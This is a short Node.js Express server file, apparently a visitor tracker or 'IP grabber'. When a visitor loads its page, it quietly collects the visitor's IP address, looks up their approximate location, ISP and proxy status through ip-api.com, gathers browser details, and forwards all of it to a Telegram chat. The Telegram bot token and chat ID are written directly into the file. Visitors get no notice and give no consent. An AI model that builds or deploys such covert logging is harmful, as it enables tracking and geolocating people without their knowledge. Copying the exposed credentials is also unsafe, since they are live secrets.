const express = require("express");
const path = require("path");

const app = express();
app.use(express.json());

// ===== CONFIG (حطهم مباشرة زي ما طلبت) =====
const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";
const PORT = process.env.PORT || 3000;

// ===== SEND TO TELEGRAM =====
async function sendToTelegram(text) {
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
    }),
  });
}

// ===== VISITOR LOGGER =====
app.post("/visit", async (req, res) => {
  try {
    // ===== REAL CLIENT IP (FULL) =====
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket.remoteAddress;

    // ===== GEO LOCATION =====
    const geoRes = await fetch(
      `http://ip-api.com/json/${ip}?fields=66846719`
    );
    const geo = await geoRes.json();

    const userAgent = req.headers["user-agent"] || "Unknown";
    const isMobile = /mobile|android|iphone/i.test(userAgent);

    const message = `
🛡️ Visit Log
----------------------
IP: ${ip}
Country: ${geo.country}
City: ${geo.city}
ISP: ${geo.isp}
ASN: ${geo.as}
VPN/Proxy: ${geo.proxy}
Hosting: ${geo.hosting}
Location: ${geo.lat}, ${geo.lon}

Device: ${isMobile ? "Mobile" : "Desktop"}
User-Agent:
${userAgent}

Language: ${req.headers["accept-language"]}
Referer: ${req.headers["referer"] || "Direct"}

Time: ${new Date().toLocaleString()}
----------------------
`;

    await sendToTelegram(message);
    res.json({ logged: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "failed" });
  }
});

// ===== SERVE HTML =====
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ===== START SERVER =====
app.listen(PORT, () => {
  console.log(`Running on http://localhost:${PORT}`);
});
